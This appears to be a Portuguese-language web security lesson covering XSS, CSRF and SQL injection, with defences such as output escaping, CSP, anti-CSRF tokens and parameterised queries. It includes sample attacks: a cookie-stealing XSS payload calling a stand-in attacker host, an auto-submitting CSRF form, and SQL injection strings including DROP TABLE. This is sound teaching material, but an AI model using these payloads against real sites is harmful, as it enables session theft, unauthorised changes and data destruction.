Um site é um alvo, mesmo que seja pequeno: há programas que percorrem a Internet à procura de falhas conhecidas, sem escolher vítimas. Três ataques clássicos explicam a maior parte dos problemas: **XSS** (correr código na página de outra pessoa), **CSRF** (fazer o browser de alguém agir sem ela querer) e **injeção de SQL** (mudar as consultas à base de dados). Todos têm defesas conhecidas e simples.

## XSS (Cross-Site Scripting)

Acontece quando dados do utilizador são inseridos numa página **como HTML**. Se uma cliente se chamar `<img src=x onerror="fetch('https://mau.com/?c='+document.cookie)">` e o painel da dona mostrar o nome com `innerHTML`, o código corre no browser da dona, com a sessão dela.

**Defesas:**

1. **Escapar à saída:** inserir texto como texto (`textContent`, ou os modelos do React, Vue, Laravel Blade e Django, que escapam automaticamente).
2. Nunca usar `innerHTML`, `dangerouslySetInnerHTML` ou `{!! !!}` com dados do utilizador. Se for mesmo preciso HTML (texto formatado), passar por uma biblioteca de limpeza (DOMPurify).
3. **Content-Security-Policy:** um cabeçalho que diz ao browser de onde pode carregar scripts (`script-src 'self'`); bloqueia scripts injetados mesmo que escape uma falha.
4. Cookies `HttpOnly`, para o JavaScript não os conseguir ler.

```js run
const nome = `Ana <img src=x onerror="alert('roubado')">`;

function escapa(s) {
  return s.replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]);
}
const perigoso = `<li>${nome}</li>`;
const seguro = `<li>${escapa(nome)}</li>`;
console.log("sem escapar:", perigoso);
console.log("escapado:   ", seguro);
console.log("tem marcação executável?", /<img/i.test(perigoso), /<img/i.test(seguro));
```

Prevê as duas versões. No escapado, o browser mostra o texto `<img …>` em vez de criar uma imagem.

## CSRF (Cross-Site Request Forgery)

A dona tem sessão iniciada no painel. Visita outro site, que contém:

```html
<form action="https://painel.salao.pt/api/precos" method="post" id="f">
  <input name="corte" value="0">
</form>
<script>document.getElementById("f").submit()</script>
```

O browser envia o pedido **com o cookie de sessão** da dona, e o preço muda.

**Defesas:**

1. Cookies com `SameSite=Lax` ou `Strict` (o browser não os envia em pedidos vindos de outros sites). É hoje o comportamento por omissão dos browsers, mas define-o explicitamente.
2. **Token anti-CSRF:** um valor aleatório em cada formulário, que o site atacante não consegue saber. As frameworks (Laravel `@csrf`, Django `{% csrf_token %}`) fazem isto por ti.
3. APIs que aceitam só `Content-Type: application/json` com um token no cabeçalho `Authorization` (não enviado automaticamente pelo browser).
4. `GET` nunca altera dados.

## Injeção de SQL

```python
# ERRADO: o texto do utilizador passa a fazer parte da consulta
sql = f"SELECT * FROM clientes WHERE telefone = '{telefone}'"
# telefone = "' OR '1'='1"  → devolve todos os clientes
# telefone = "'; DROP TABLE clientes; --"  → em algumas bases de dados, apaga a tabela

# CERTO: consultas parametrizadas; os dados nunca são interpretados como SQL
db.execute("SELECT * FROM clientes WHERE telefone = ?", (telefone,))
```

Vale para todas as linguagens e ORMs: nunca construir consultas juntando texto. O mesmo princípio aplica-se a comandos da shell (`subprocess.run([...])` com lista de argumentos, não uma string com `shell=True`) e a consultas NoSQL.

## O resto da lista OWASP Top 10

- **Controlo de acesso partido:** ver ou mudar dados de outros alterando um id (lição 6).
- **Falhas criptográficas:** HTTP sem S, palavras-passe mal guardadas.
- **Componentes vulneráveis:** bibliotecas desatualizadas com falhas conhecidas (`npm audit`, Dependabot).
- **Configuração insegura:** mensagens de erro com a pilha toda em produção, painéis de administração abertos, regras do Firebase com `".read": true`.
- **SSRF:** o servidor faz pedidos a URLs dadas pelo utilizador e é levado a aceder à rede interna.

## Cabeçalhos de segurança úteis

```
Content-Security-Policy: default-src 'self'; img-src 'self' data: https:
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
```

Verifica um site em securityheaders.com e no Mozilla Observatory.
